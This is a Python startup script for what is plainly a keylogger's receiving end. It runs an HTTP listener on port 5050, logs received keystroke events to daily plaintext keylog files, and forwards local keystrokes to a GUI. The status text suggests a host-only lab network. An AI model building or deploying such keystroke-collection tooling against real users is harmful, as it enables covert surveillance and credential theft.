# startup.py
import os, json, datetime, threading, sys
from receiver_http import start_http_server, incoming_events
from modules.gui_ctk import App
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

def _log_path():
    d = datetime.date.today().isoformat()
    return os.path.join(LOG_DIR, f"keylog-{d}.txt")

def append_to_log(evt: dict):
    with open(_log_path(), "a", encoding="utf-8") as f:
        f.write(json.dumps(evt, ensure_ascii=False) + "\n")

# import YOUR GUI
sys.path.append(os.path.join(os.path.dirname(__file__), "modules"))
from gui_ctk import App

LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 5050

if __name__ == "__main__":
    # start HTTP receiver in background
    threading.Thread(target=start_http_server, args=(LISTEN_IP, LISTEN_PORT), daemon=True).start()

    # launch your GUI
    app = App()

    # if you have a status label, set it softly (ignore if not present)
    try:
        app.status.configure(text=f"Listening on {LISTEN_IP}:{LISTEN_PORT} | Network: host-only | Logging: PLAINTEXT")
    except Exception:
        pass

    app.attach_event_queue(incoming_events, log_fn=append_to_log)

    # Also forward LOCAL keystrokes to the same queue for live preview
    try:
        app.logger.set_ui_queue(incoming_events)   # uses set_ui_queue we added
    except Exception:
        pass

    app.mainloop()
